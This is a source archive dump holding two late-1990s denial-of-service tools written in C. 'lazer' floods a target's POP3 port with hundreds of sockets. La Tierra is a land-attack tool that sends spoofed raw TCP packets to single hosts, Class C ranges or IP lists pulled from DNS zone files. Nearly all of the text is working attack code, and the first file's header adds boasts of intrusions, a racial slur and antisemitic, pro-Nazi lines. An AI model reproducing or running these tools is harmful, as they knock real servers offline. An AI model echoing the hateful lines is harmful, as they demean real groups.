            " *   05/09/99 <---> Will kill all fuckin' hostile enemies...",
            " * ps -enemy | more  > diablo ; less diablo",
            " * killall -9 enemy",
            " * Compile with : gcc -o lazer laser.c -w",
            " *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*",
            " *                                                                         *",
            " * cindy_      --whoaah ... keep just a nick ... cindy_ ,sarah_ ,dunno just*",
            " *               keep one my love }{                                       *",
            " ikebana     -- aka wildrose ... for being Bianca's friend                                                                         *  ",
            " * |avi|       --see DrMengele suck ... tudor.intelsev.ro rock on :>       *",
            " * coole       --xjust wanna kill you,shock is thinking you are mad and I  *",
            " *               know you are just a lamer :P :>>>>                        *",
            " * someone_    --Don't worry ,I know you still love me a bit               *",
            " * Pain_Keep   --Hey brother thanks a lot for that shells and take care about*",
            " *               someone_ ...                                              *",
            " * xjust       -- :PPPPPP hello pal thanx a lot for keepin' TheX on #r00t  *",
            " *               on UnderNet ...                                           *",
            " * adi_        --Don't tell nobody about larc.nasa.gov penetration :)))    *",
            " * LIU_KANG    --You are happy bro you are in Timisoara with your love ... *",
            " *               I'm not :((( Hey ,and take care on #proromania            *",
            " * heartbeat   --I still remember you and I have some feelings on this     *",
            " * Himself     --Are you still one of my friends ? :>                      *",
            " * Eclipsse    --Long live the net man ... come on to drink a beer  :)     *",
            " * CyberS      --You was a grate hacker ,now you are admin on robotics.ucv.*",
            " *               ro ...Hey and are you t0x1k now :P :>                     *",
            " * moartea     --Hey Sorin are you the same with Angst ... stealth hacker:P*",
            " * Lucix       --You and moartea(Angst) you 2 was the real hackers of the  *",
            " *               big.fishnet.net and others not Metal(DrMengele) :>>>      *",
            " * SSL         --Hey ninja (Stefan Laudat) you are one of the best wizards *",
            " *               on the net ... Are you still in Romanina ... oh shit      *",
            " *               and still the sys-admin on ProTv ?                        *   ",
            " * pHEUR       --Adrian where the hell are you stealth now ... 10x a lot   *",
            " *               for all that you have teach me ,I heared you are at Berkeley*",
            " * DanyS       --I wanna come back on DalNet and I wanna make a chat again *",
            " *               with you ... You and pHEUR ... you can be a great team :> *",
            " * noob        --No comment man ... I'll added one ...maybe                *",
            " * Canaris     --Stay there on #twilight_zone you are useful :P            *",
            " * JazZzy      --Dunno ... Don't kick me again .. lolz                     *",
            " * thejoker    --Come back man , come back                                 *",
            " * Shock       --You have some ideas .. trust to me                        *",
            " * Valentin-   --Go back ,we have much to work man .. trust to me ... you  *",
            " *               are a good one ,maybe very good ,go back                 *",
            " * capone      --Hey you Al Capone don't stay all the day on a chair and   *",
            " *               ... advise (stay in a armchair :> ) and damn ... hack a   *",
            " *               aaa .... eh ,anything                                     *",
            " * ttyp0       --How the hell is in Finland and you cock again when you stay*",
            " *               on the net ? ... How is when Tanenbaum is your teacher ?  * ",
            " *               and Linus Torvalds (Linux Inventator ) is there ?         *",
            " * duke_       --All the day I hear ... duke ,duke ... a new exploit made by*",
            " *               duke or humble | horizon                                  *",
            " * MostHated   --And the big hackers can go into the jail ... Sorry pal    *   ",
            " * stderr      -- #uground --Brasnet  10x a lot for all                    *",
            " * etcetc ...Sorry for all that I missed here ... :(((                     *",
            " *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*",
            " * Fuck El Diablo for hacking on Finance Ministery and making me some troubles",
            " * Shout out to :",
            " * hawkeye -- Fow being the most big lamer on the net",
            " * Moshul  -- Fuck you idiot you lie and suck and lick in butt ...",
            " * sysctl  -- #hack from UnderNet one channel full with lamerz and niggerz",
            " * dialog  -- Big and fool",
            " * mihnea  -- For being a sucker  ",
            " * DrMengele- You suck ,and sucker wash your body and your hair (Yeaks)",
            " * Metal_Boy- I hate all the jews ---\"Jutanblut sol spritzen\"",
            " * Himmler -- Can a jew be a nazist ?",
            " * b0ca    -- #hackers sucks like many UnderNet channels ... If the lamers ",
            " *            could fly the UnderNet would be the most big airport in the world",
            " * Yasmine -- Where the hell are you now ?I liked you Julia now 2 years ...still",
            " *            in Cluj?                                                   ",
            " * Ella    -- So sorry afer a year I know nothing can be done , I must go to ",
            " *            Timisoara and leave the ideea of Bucuresti --",
            " * etcetc  -- Coz are many lamerz on the net ... Fuck them all ",
            "#include <stdio.h>",
            "#include <string.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <netinet/in.h>",
            "#include <netdb.h>",
            "char sarah[123];",
            "char linea1[100];",
            "int bianca,x,i,",
            "    a,b,c,d;",
            "int sock[10000];",
            "int numsock = 400;",
            "struct sockaddr_in sock_dest;",
            "char host_dest[100];",
            "char enter[2];",
            "main(int argc,char *argv[])",
            "   struct hostent *target;",
            "   enter[0]='\\n';",
            "   enter[1]='\\0';",
            "   if(argc < 2){",
            "     printf(\"\\033[1;34m Usage\\033[1;32m:\\033[1;33m %s \\033[1;35m<\\033[1;34mtarget\\033[1;35m> \\033[0m  \\n\",argv[0]);",
            "     exit(0);",
            "   }",
            "   strcpy(sarah,argv[1]);",
            "   if (sscanf(sarah,\"%d.%d.%d.%d\",&a,&b,&c,&d) != 4) {",
            "      target = gethostbyname(sarah);",
            "      if (target == NULL) {",
            "         printf(\"\\033[1;34mAhhhhhhh! cannot resolve host %s\\033[0m\",sarah);",
            "         exit(0);",
            "      }",
            "      sprintf(host_dest,\"%d.%d.%d.%d\",(unsigned char ) target->h_addr_list[0][0],",
            "                                      (unsigned char ) target->h_addr_list[0][1],",
            "                                      (unsigned char ) target->h_addr_list[0][2],",
            "                                      (unsigned char ) target->h_addr_list[0][3]);",
            "   }",
            "   else {",
            "      strncpy(host_dest,sarah,123);",
            "   }",
            "   fprintf(stdout,\"[LaSEr] Attacking : %s\\n\",host_dest);",
            "   sock_dest.sin_family = AF_INET;",
            "   sock_dest.sin_port = htons(110);                         /* pop3 port */",
            "   sock_dest.sin_addr.s_addr = inet_addr(host_dest);",
            "  bianca=0;",
            "   while(bianca <= 99999){",
            "      i=0;",
            "     while(i<numsock){",
            "             sock[i] = socket(AF_INET,SOCK_STREAM,0);",
            "             if(sock[i] < 0) {",
            "               fprintf(stdout,\"ERROR: socket() failed\\n\");",
            "               exit(0);",
            "             }",
            "             x = connect(sock[i],(struct sockaddr *) &sock_dest,sizeof(sock_dest));",
            "             if(x < 0){",
            "               fprintf(stdout,\"Ooooooppppppps ... Can't connect to pop3 server ~:cD\\n\");",
            "               exit(0);",
            "           }",
            "           i++;",
            "       }",
            "             /* FlASh */",
            "             strcpy(linea1,\"user \");",
            "             strcat(linea1,\"pass\");",
            "           strcat(linea1,\" user\");",
            "           strcat(linea1,\"pass\");",
            "           //printf(\"\\033[1;34m b00m \\033[0m \");",
            "        i=0;",
            "      while(i<numsock){",
            "             send(sock[i],linea1,strlen(linea1)*sizeof(char),0);",
            "             bzero(linea1,strlen(linea1));",
            "             i++;",
            "      }",
            "      i=0;",
            "      while(i<numsock){",
            "           close(sock[i]);",
            "      }",
            "        bianca++;",
            "   }",
            "   fprintf(stdout,\"\\nThe END. diablo@tudor.inelsev.ro Team  1999\\n\");",
            "   fprintf(stdout,\"\\n I'll love you all my life sarah_ ... \\n\");",
            "   fprintf(stdout,\"\\n We take the chance for a game that never ends ... \");",
            "datapool/src/latierra.c",
            "0100644",
            "0000000",
            "0000000",
            "00000056355",
            "07100655516",
            "014141",
            "ustar  ",
            "root",
            "root",
            "/**************************************************************/",
            "/*                                                            */",
            "/*  La Tierra v1.0b  - by MondoMan (KeG), elmondo@usa.net     */",
            "/*                                                            */",
            "/*  Modified version of land.c by m3lt, FLC                   */",
            "/*                                                            */",
            "/*  Compiled on RedHat Linux 2.0.27, Intel Pentium 200Mhz     */",
            "/*  gcc version 2.7.2.1       tabs set to 3                   */",
            "/*                                                            */",
            "/*  gcc latierra.c -o latierra                                */",
            "/*                                                            */",
            "/*  Refer to readme.txt for more details and history          */",
            "/*                                                            */",
            "/**************************************************************/                                  ",
            "#include <stdio.h>",
            "#include <getopt.h>",
            "#include <string.h>",
            "#include <netdb.h>",
            "#include <arpa/inet.h>",
            "#include <netinet/in.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/tcp.h>",
            "/*#include <netinet/protocols.h>*/ ",
            "#define DEFAULT_FREQUENCY\t\t1 ",
            "#define TRUE\t \t\t\t\t\t1",
            "#define FALSE   \t\t\t\t\t0",
            "#define FOR_EVER \t\t\t\t\t-5",
            "#define LIST_FILE  \t\t\t\t1",
            "#define ZONE_FILE  \t\t\t\t2",
            "#define MAXLINELENGTH \t\t\t512",
            "#define DEFAULT_SEQ\t\t\t\t0xF1C",
            "#define DEFAULT_TTL           0xFF",
            "#define DEFAULT_TCPFLAGS      (TH_SYN | TH_PUSH)",
            "#define DEFAULT_WINSIZE       0xFDE8",
            "struct pseudohdr",
            "   struct in_addr saddr;",
            "   struct in_addr daddr;",
            "   u_char zero;",
            "   u_char protocol;",
            "   u_short length;",
            "   struct tcphdr tcpheader;",
            "typedef struct latierra_data",
            "\tchar dest_ip[256];",
            "\tint  tcp_flags;",
            "\tint  window_size;",
            "\tint  ip_protocol;",
            "\tint  sequence_number;",
            "\tint  ttl;",
            "\tint  supress_output;",
            "        int  message_type;",
            "\t} LATIERRA_DATA;",
            "void alternatives(void);",
            "int  get_ip(int use_file, FILE *fp, char *buff);",
            "int  land(LATIERRA_DATA *ld, int port_number);",
            "void nslookup_help(void);",
            "void print_arguments(void);",
            "void protocol_list(void);",
            "/********/",
            "/* main */",
            "/********/",
            "int main(int argc, char **argv)",
            "\tFILE *fp;",
            "\tLATIERRA_DATA ld;",
            "\tint frequency = DEFAULT_FREQUENCY, x;",
            "\tint beginning_port=1, octet=1, scan_loop=0, loop_val=0, use_file=FALSE;",
            "\tint ending_port = 0, loop = TRUE, i = 0, increment_addr = FALSE;",
            "   char got_ip = FALSE, got_beg_port = FALSE;",
            "\tchar class_c_addr[21], filename[256], buff[512], valid_tcp_flags[16];",
            "\tprintf(\"\\nlatierra v1.0b by MondoMan (elmondo@usa.net), KeG\\n\");",
            "   printf(\"Enhanced version of land.c originally developed by m3lt, FLC\\n\");",
            "\tstrcpy(valid_tcp_flags, \"fsrpau\");",
            "\tld.tcp_flags = 0;",
            "\tld.window_size = DEFAULT_WINSIZE;",
            "\tld.ip_protocol = IP_TCP;",
            "\tld.sequence_number = DEFAULT_SEQ;",
            "\tld.ttl = DEFAULT_TTL;",
            "\tld.message_type = 0;",
            "\tif(argc > 1 && (!strcmp(argv[1], \"-a\")))",
            "\t\talternatives();",
            "\tif(argc > 1 && (!strcmp(argv[1], \"-n\")))",
            "\t\tnslookup_help();",
            "\tif(argc > 1 && (!strcmp(argv[1], \"-p\")))",
            "\t\tprotocol_list();",
            "\tif(argc == 1 || ( (argc >= 2) && (!strcmp(argv[1], \"-h\"))))",
            "\t\tprint_arguments();",
            "\twhile((i = getopt(argc, argv, \"i:b:e:s:l:o:t:w:p:q:v:m:\")) != EOF)",
            "\t\tswitch(i)",
            "\t\t\t{\t",
            "\t\t\tcase 't':",
            "\t\t\t\tfor(x=0;x<strlen(optarg);x++)",
            "\t\t\t\t\tswitch(optarg[x])",
            "\t\t\t\t\t\t{",
            "\t\t\t\t\t\tcase 'f':                        /* fin */",
            "\t\t\t\t\t\t\tld.tcp_flags |= TH_FIN;",
            "\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\tcase 's':                        /* syn */",
            "\t\t\t\t\t\t\tld.tcp_flags |= TH_SYN;",
            "\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\tcase 'r':                        /* reset */",
            "\t\t\t\t\t\t\tld.tcp_flags |= TH_RST;",
            "\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\tcase 'p':                        /* push */",
            "\t\t\t\t\t\t\tld.tcp_flags |= TH_PUSH;\t\t\t",
            "\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\tcase 'a':                        /* ack */",
            "\t\t\t\t\t\t\tld.tcp_flags |= TH_ACK;",
            "\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\tcase 'u':                        /* urgent */",
            "\t\t\t\t\t\t\tld.tcp_flags |= TH_URG;",
            "\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\tdefault:",
            "\t\t\t\t\t\t\tprintf(\"\\nERROR: Invalid option specified [ %c ] for tcp_flags.\\n\\n\", optarg[x]);",
            "\t\t\t\t\t\t\treturn(-12);",
            "\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t}",
            "\t\t\t\tbreak;",
            "\t\t\tcase 'q':",
            "\t\t\t\tld.sequence_number = atoi(optarg);",
            "\t\t\t\tbreak;",
            "\t\t\tcase 'w':",
            "\t\t\t\tld.window_size = atoi(optarg);",
            "\t\t\t\tbreak;",
            "\t\t\tcase 'm':",
            "\t\t\t\tld.message_type = atoi(optarg);",
            "\t\t\t\tbreak;",
            "\t\t\tcase 'v':",
            "\t\t\t\tld.ttl = atoi(optarg);",
            "\t\t\t\tbreak;",
            "\t\t\tcase 'p':",
            "\t\t\t\tld.ip_protocol = atoi(optarg);",
            "\t\t\t\tbreak;",
            "\t\t\tcase 'o':",
            "\t\t\t\tld.supress_output = TRUE;",
            "\t\t\t\tbreak;",
            "\t\t\tcase 'i':",
            "\t\t\t\tif(strlen(optarg) > 1)",
            "\t\t\t\t\tstrcpy(ld.dest_ip, optarg);",
            "\t\t\t\telse",
            "\t\t\t\t\t{",
            "\t\t\t\t\tprintf(\"ERROR: Must specify valid IP or hostname.\\n\");",
            "\t\t\t\t\treturn(-6);",
            "\t\t\t\t\t}",
            "\t\t\t\tgot_ip = TRUE;",
            "\t\t\t\tbreak;",
            "\t\t\tcase 's':",
            "\t\t\t\tfrequency = atoi(optarg);\t",
            "\t\t\t\tbreak;",
            "\t\t\tcase 'l':",
            "\t\t\t\tloop = atoi(optarg);",
            "\t\t\t\tbreak;",
            "\t\t\tcase 'b':",
            "\t\t\t\tbeginning_port = atoi(optarg);",
            "\t\t\t\tgot_beg_port = TRUE;",
            "\t\t\t\tbreak;",
            "\t\t\tcase 'e':",
            "\t\t\t\tending_port = atoi(optarg);",
            "\t\t\t\tbreak;",
            "\t\t\t}",
            "\tif(!ld.tcp_flags)",
            "\t\tld.tcp_flags = DEFAULT_TCPFLAGS;",
            "\tif(!got_beg_port)",
            "\t\tfprintf(stderr, \"\\nMust specify beginning port number.  Use -h for help with arguments.\\n\\n\");",
            "\t\treturn(-7);",
            "\tif(ending_port == 0)",
            "\t\tending_port = beginning_port;",
            "\tprintf(\"\\nSettings:\\n\\n\");",
            "   printf(\"  (-i)   Dest. IP Addr   : \");",
            "\tif(ld.dest_ip[strlen(ld.dest_ip) -1] == '-')",
            "\t\tld.dest_ip[strlen(ld.dest_ip)-1] = 0x0;",
            "\t\tstrcpy(class_c_addr, ld.dest_ip);",
            "\t\tstrcat(ld.dest_ip, \"1\");",
            "\t\tprintf(\" %s (Class C range specified).\\n\", ld.dest_ip);",
            "\t\tincrement_addr = TRUE;",
            "\t\toctet = 1;",
            "\telse",
            "\t\tif(strlen(ld.dest_ip) > 5)",
            "\t\t\t{",
            "\t\t\tif(strncmp(ld.dest_ip, \"zone=\", 5)==0)",
            "\t\t\t\t{",
            "\t\t\t\tstrcpy(filename, &ld.dest_ip[5]);",
            "\t\t\t\tprintf(\"%s (using DNS zone file)\\n\", filename);",
            "\t\t\t\tuse_file = ZONE_FILE;",
            "\t\t\t\t}\t",
            "\t\t\telse if(strncmp(ld.dest_ip, \"list=\", 5) == 0)",
            "\t\t\t\t{",
            "\t\t\t\tstrcpy(filename, &ld.dest_ip[5]);",
            "\t\t\t\tprintf(\"%s (using ASCII list)\\n\", filename);",
            "\t\t\t\tuse_file = LIST_FILE;",
            "\t\t\t\t}",
            "\t\t\telse",
            "\t\t\t\tprintf(\"%s\\n\", ld.dest_ip);",
            "\t\t\t}",
            "\t\telse ",
            "\t\t\t{",
            "\t\t\tprintf(\"Destination specifier (%s) length must be > 7.\\n\", ld.dest_ip);",
            "\t\t\treturn(-9);",
            "\t\t\t}",
            "\tprintf(\"  (-b)   Beginning Port #: %d\\n\",     beginning_port );",
            "\tprintf(\"  (-e)   Ending Port #   : %d\\n\",     ending_port );",
            "\tprintf(\"  (-s)   Seconds to Pause: %d\\n\",     frequency );",
            "\tprintf(\"  (-l)   Loop            : %d %s\\n\",  loop, (loop == FOR_EVER) ? \"(forever)\" : \" \" );",
            "\tprintf(\"  (-w)   Window size     : %d\\n\",     ld.window_size );",
            "\tprintf(\"  (-q)   Sequence Number : %X (%d)\\n\",ld.sequence_number, ld.sequence_number );",
            "\tprintf(\"  (-v)   Time-to-Live    : %d\\n\",     ld.ttl);",
            "\tprintf(\"  (-p)   IP Protocol #   : %d\\n\",     ld.ip_protocol );",
            "\tprintf(\"  (-t)   TCP flags       : \"); ",
            "\tstrcpy(buff, \"\");",
            "\tif( ld.tcp_flags & TH_FIN)",
            "\t\tstrcat(buff, \"fin \");",
            "\tif( ld.tcp_flags & TH_SYN)",
            "\t\tstrcat(buff, \"syn \");",
            "\tif(ld.tcp_flags & TH_RST)",
            "\t\tstrcat(buff, \"rst \");",
            "\tif(ld.tcp_flags & TH_PUSH)",
            "\t\tstrcat(buff, \"push \");",
            "\tif(ld.tcp_flags & TH_ACK)",
            "\t\tstrcat(buff, \"ack \");",
            "\tif(ld.tcp_flags & TH_URG)",
            "\t\tstrcat(buff, \"urg \");",
            "\tprintf(\"%s\\n\\n\", buff);",
            "\tif(ending_port < beginning_port)",
            "\t\tprintf(\"\\nERROR: Ending port # must be greater than beginning port #\\n\\n\");",
            "\t\treturn(-8);",
            "\tscan_loop = loop_val = loop;",
            "\tif(use_file)",
            "\t\tif(access(filename, 0))",
            "\t\t\t{",
            "\t\t\tprintf(\"\\nERROR: The file you specified (%s) cannot be found.\\n\\n\", filename);",
            "\t\t\treturn(-9);",
            "\t\t\t}",
            "\t\tif( (fp = fopen(filename, \"rt\")) == NULL)",
            "\t\t\t{",
            "\t\t\tprintf(\"ERROR: Unable to open %s.\\n\", filename);",
            "\t\t\treturn(-10);",
            "\t\t\t}",
            "\t\tif(!get_ip(use_file, fp, buff))",
            "\t\t\t{",
            "\t\t\tprintf(\"Unable to get any IP address from file %s.\\n\");",
            "\t\t\treturn(-11);",
            "\t\t\t}",
            "\t\tstrcpy(ld.dest_ip, buff);",
            "\twhile( (loop == FOR_EVER) ? 1 : loop-- > 0)",
            "\t\tfor(i=beginning_port; i <= ending_port; i++)",
            "\t\t\t{",
            "\t\t\tif(land(&ld, i))        /* go for it BaBy! */",
            "\t\t\t\tbreak;",
            "   \t\tif(frequency)          /* make sure freq > 0 */",
            "\t\t\t \t{",
            "\t\t\t\tif(!ld.supress_output)",
            "\t\t\t\t\tprintf(\"-> paused %d seconds.\\n\", frequency);",
            "\t\t\t\t}",
            "\t\t\t}",
            "\t\tif( (!use_file) && (loop && increment_addr) )",
            "\t\t\t{",
            "\t\t\tchar temp_addr[21];",
            "\t\t\tif(++octet > 254)                        /* check for reset */",
            "\t\t\t\t{",
            "\t\t\t\tif(loop_val != FOR_EVER)              /* make sure not to distrute forever! */",
            "\t\t\t\t\t{",
            "\t\t\t\t\tif(++scan_loop > loop_val)        /* check if scanned x times */",
            "\t\t\t\t\t\tbreak;",
            "\t\t\t\t\telse",
            "\t\t\t\t\t\tloop = loop_val;                /* restore original value */",
            "\t\t\t\t\t}",
            "\t\t\t\toctet = 1;\t                          /* reset */",
            "\t\t\t\t}",
            "\t\t\tsprintf(temp_addr, \"%s%d\", class_c_addr, octet);",
            "\t\t\tstrcpy(ld.dest_ip, temp_addr);",
            "\t\t\tif(!ld.supress_output)",
            "\t\t\t\tprintf(\"** incrementing to next IP address: %s\\n\", ld.dest_ip);",
            "\t\t\tif(scan_loop > loop_val)",
            "\t\t\t\tbreak;\t/* break while loop */",
            "\t\t\t}",
            "\t\telse if(use_file)",
            "\t\t\t{",
            "\t\t\tif(!get_ip(use_file, fp, buff))",
            "\t\t\t\tbreak;",
            "\t\t\tloop++;",
            "\t\t\tstrcpy(ld.dest_ip, buff);",
            "\t\t\t}",
            "\t\t} /* end while */",
            "\tprintf(\"\\nDone.\\n\\n\");",
            "} /* end main */",
            "int  get_ip(int use_file, FILE *fp, char *buff)",
            "\tif(use_file == LIST_FILE)",
            "\t\treturn(get_ip_from_list(fp, buff));",
            "\treturn(get_ip_from_zone(fp, buff));",
            "int get_ip_from_list(FILE *fp, char *buff)",
            "\tint ret_val;",
            "\twhile(1)",
            "\t\tret_val = (int)fgets(buff, MAXLINELENGTH, fp);",
            "\t\tif((ret_val == EOF) || (ret_val == (int)NULL))",
            "\t\t\treturn 0;",
            "\t\tif( strlen(buff) >= 7)",
            "\t\t\tif((buff[0] != ';') && (buff[0] != '['))",
            "\t\t\t\t{",
            "\t\t\t\tif( (buff[strlen(buff)-1] == '\\r') || (buff[strlen(buff)-1] == '\\n') )",
            "\t\t\t\t\tbuff[strlen(buff)-1] = 0x0;",
            "\t\t\t\treturn 1;",
            "\t\t\t\t}",
            "\treturn 0;",
            "int get_ip_from_zone(FILE *fp, char *buff)",
            "\tint ret_val, i;",
            "\tchar *p, delim[8];",
            "\tstrcpy(delim, \" \\t\");",
            "\twhile(1)",
            "\t\tret_val = (int)fgets(buff, MAXLINELENGTH, fp);",
            "\t\tif((ret_val == EOF) || (ret_val == (int)NULL))",
            "\t\t\treturn 0;",
            "\t\tif( strlen(buff) >= 7)",
            "\t\t\tif((buff[0] != ';') && (buff[0] != '[') && (strncmp(buff, \"ls -d\", 5) != 0))",
            "\t\t\t\t{",
            "\t\t\t\tif( (p = strtok( buff, delim)) == NULL)",
            "\t\t\t\t\tcontinue;",
            "\t\t\t\tif( (p = strtok(NULL, delim)) == NULL)",
            "\t\t\t\t\tcontinue;",
            "\t\t\t\tif(strcmp(p, \"A\"))   /* be sure second column is an DNS A record */",
            "\t\t\t\t\tcontinue;",
            "\t\t\t\t",
            "\t\t\t\tif( (p = strtok(NULL, delim)) == NULL)",
            "\t\t\t\t\tcontinue;",
            "\t\t\t\tstrcpy(buff, p);",
            "\t\t\t\t/* verify that we have a valid IP address to work with */",
            "\t\t\t\tif(inet_addr(p) == -1)",
            "\t\t\t\t\tcontinue;",
            "\t\t\t\t/* strip off training line characters */",
            "\t\t\t\t",
            "\t\t\t\tif( (buff[strlen(buff)-1] == '\\r') || (buff[strlen(buff)-1] == '\\n') )",
            "\t\t\t\t\tbuff[strlen(buff)-1] = 0x0;",
            "\t\t\t\treturn 1;",
            "\t\t\t\t}",
            "\treturn 0;",
            "/************/",
            "/* checksum */",
            "/************/",
            "u_short checksum(u_short * data,u_short length)",
            "\tregister long value;",
            "\tu_short i;",
            "\tfor(i = 0; i< (length >> 1); i++)",
            "\t\tvalue += data[i];",
            "\tif((length & 1)==1)",
            "\t\tvalue += (data[i] << 8);",
            "\tvalue = (value & 0xFFFF) + (value >> 16);",
            "\treturn(~value);",
            "/********/",
            "/* land */",
            "/********/",
            "int land(LATIERRA_DATA *ld,  int port_number)",
            "\tstruct sockaddr_in sin;",
            "   int sock;",
            "   char buffer[40];",
            "   struct iphdr * ipheader = (struct iphdr *) buffer;",
            "   struct tcphdr * tcpheader=(struct tcphdr *) (buffer+sizeof(struct iphdr));",
            "   struct pseudohdr pseudoheader;",
            "\tbzero(&sin,sizeof(struct sockaddr_in));",
            "   sin.sin_family=AF_INET;",
            "   if((sin.sin_addr.s_addr=inet_addr(ld->dest_ip))==-1)",
            "   \t{",
            "      printf(\"ERROR: unknown host %s\\n\", ld->dest_ip);",
            "      return(-1);",
            "      }",
            "\tif((sin.sin_port=htons(port_number))==0)",
            "  \t\t{",
            "      printf(\"ERROR: unknown port %s\\n\",port_number);",
            "      return(-2);",
            "      }",
            "\tif((sock=socket(AF_INET,SOCK_RAW,255))==-1)",
            "   \t{",
            "      printf(\"ERROR: couldn't allocate raw socket\\n\");",
            "      return(-3);",
            "      }",
            "\tbzero(&buffer,sizeof(struct iphdr)+sizeof(struct tcphdr));",
            "   ipheader->version=4;",
            "   ipheader->ihl=sizeof(struct iphdr)/4;",
            "   ipheader->tot_len=htons(sizeof(struct iphdr)+sizeof(struct tcphdr));",
            "   ipheader->id=htons(ld->sequence_number);",
            "   ipheader->ttl = ld->ttl;",
            "   ipheader->protocol = ld->ip_protocol;",
            "   ipheader->saddr=sin.sin_addr.s_addr;",
            "   ipheader->daddr=sin.sin_addr.s_addr;",
            "   tcpheader->th_sport = sin.sin_port;",
            "   tcpheader->th_dport = sin.sin_port;",
            "   tcpheader->th_seq = htonl(ld->sequence_number);",
            "   tcpheader->th_flags = ld->tcp_flags;",
            "   tcpheader->th_off = sizeof(struct tcphdr)/4;",
            "   tcpheader->th_win = htons(ld->window_size);",
            "   bzero(&pseudoheader,12+sizeof(struct tcphdr));",
            "   pseudoheader.saddr.s_addr=sin.sin_addr.s_addr;",
            "   pseudoheader.daddr.s_addr=sin.sin_addr.s_addr;",
            "   pseudoheader.protocol = ld->ip_protocol;",
            "   pseudoheader.length = htons(sizeof(struct tcphdr));",
            "   bcopy((char *) tcpheader,(char *) &pseudoheader.tcpheader,sizeof(struct tcphdr));",
            "   tcpheader->th_sum = checksum((u_short *) &pseudoheader,12+sizeof(struct tcphdr));",
            "   if( sendto(sock, \tbuffer, ",
            "\t\t\t\t\t\t\tsizeof(struct iphdr)+sizeof(struct tcphdr),",
            "\t\t\t\t\t\t\tld->message_type,",
            "\t\t\t\t\t\t\t(struct sockaddr *) &sin,",
            "\t\t\t\t\t\t\tsizeof(struct sockaddr_in) )==-1)",
            "   \t{",
            "      printf(\"ERROR: can't send packet. (sendto failed)\\n\");",
            "      return(-4);",
            "      }",
            "\tif(!ld->supress_output)",
            "\t\tprintf(\"-> packet successfully sent to: %s:%d\\n\", ld->dest_ip, port_number);",
            "   close(sock);",
            "   return(0);",
            "/* End of land */",
            "void alternatives()",
            "\tprintf(\"\\nAlternative command line arguments for option -i\\n\\n\");",
            "\tprintf(\"    You can create two types of files that latierra can use to get\\n\");",
            "\tprintf(\"    a list of IP addresses, a simple ASCII file with each IP address\\n\");",
            "\tprintf(\"    appearing on each line or better yet, a DNS zone file created by\\n\");",
            "\tprintf(\"    nslookup.  If you are unfamiliar with nslookup, specify a '-n' on the\\n\");",
            "\tprintf(\"    command line of latierra.\\n\\n\");",
            "\tprintf(\"    Basically, latierra will walk down the list and send the spoofed packet\\n\");",
            "\tprintf(\"    to each IP address.  Once the list is complete, and loop > 1, the list\\n\");",
            " \tprintf(\"    is repeated.   To specify that the '-i' option should use a zone file,\\n\");",
            "\tprintf(\"    specify \\\"zone=filename.txt\\\" instead of an IP address.  To specify a \\n\");",
            "\tprintf(\"    simple ASCII list of IP addresses, use \\\"list=filename.txt\\\".  Lines\\n\");",
            "\tprintf(\"    beginning with ';' or '[' are ignored.  Lines that are not an 'A' \\n\");",
            "\tprintf(\"    record (second column)in a zone file will ignored.\\n\\n\");",
            "\texit(-1);",
            "void nslookup_help()",
            "\tprintf(\"\\nNSLOOKUP help\\n\\n\");",
            "\tprintf(\"To see who is the DNS server for a particular domain, issue the following:\\n\");",
            "\tprintf(\"        > set type=ns\\n\");",
            "\tprintf(\"        > xyz.com\\n\\n\");",
            "\tprintf(\"  You will see a list of the name server(s) if completed successfully\\n\\n\");",
            "\tprintf(\"To get a list of all the DNS entries for a particular domain, run nslookup\\n\");",
            "\tprintf(\"and issue the following commands:\\n\");",
            "\tprintf(\"         > server 1.1.1.1\\n\");",
            "\tprintf(\"         > ls -d xyz.com > filename.txt\\n\\n\");",
            "\tprintf(\"Line 1 sets the server that nslookup will use to resolve a name.\\n\");",
            "\tprintf(\"Line 2 requires all the information about xyz.com be written to filename.txt\\n\\n\"); ",
            "\texit(-1);",
            "void protocol_list()",
            "\tprintf(\"\\nProtocol List:\\n\\n\");\t",
            "\tprintf(\"Verified:\\n\");",
            "\tprintf(\"1-ICMP   2-IGMP   3-GGP  5-ST   6-TCP   7-UCL   8-EGP   9-IGP  10-BBN_RCC_MON\\n\");",
            "\tprintf(\"11-NVP11   13-ARGUS   14-EMCON   15-XNET   16-CHAOS   17-UDP   18-MUX\\n\");",
            "\tprintf(\"19-DCN_MEAS   20-HMP   21-PRM   22-XNS_IDP   23-TRUNK1   24-TRUNK2\\n\");",
            "\tprintf(\"25-LEAF1   26-LEAF2    27-RDP   28-IRTP      29-ISO_TP4  30-NETBLT\\n\");",
            "\tprintf(\"31-MFE_NSP   32-MERIT_INP   33-SEP   34-3PC   62-CFTP    64-SAT_EXPAK\\n\");",
            "\tprintf(\"66-RVD       67-IPPC        69-SAT_MON   70-VISA         71-IPCV\\n\");",
            "\tprintf(\"76-BR_SAT_MON   77-SUN_ND   78-WB_MON   79-WB_EXPAK   80-ISO_IP\\n\");",
            "\tprintf(\"81-VMTP   82-SECURE_VMTP   83-VINES  84-TTP   85-NSFNET_IGP   86-DGP\\n\");",
            "\tprintf(\"87-TCF    88-IGRP          89-OSPFIGP         90-SPRITE_RPG   91-LARP\\n\\n\");",
            "\tprintf(\"Supported:\\n\");",
            "\tprintf(\"    6-TCP     17-UDP    (future: PPTP, SKIP) \\n\\n\");",
            "\texit(-1);",
            "void print_arguments()",
            "\tprintf(\"Arguments: \\n\");",
            "\tprintf(\"     *   -i dest_ip = destination ip address such as 1.1.1.1\\n\");",
            "\tprintf(\"                If last octet is '-', then the address will increment\\n\");",
            "\tprintf(\"                from 1 to 254 (Class C) on the next loop\\n\");",
            "\tprintf(\"                and loop must be > 1 or %d (forever).\\n\", FOR_EVER);",
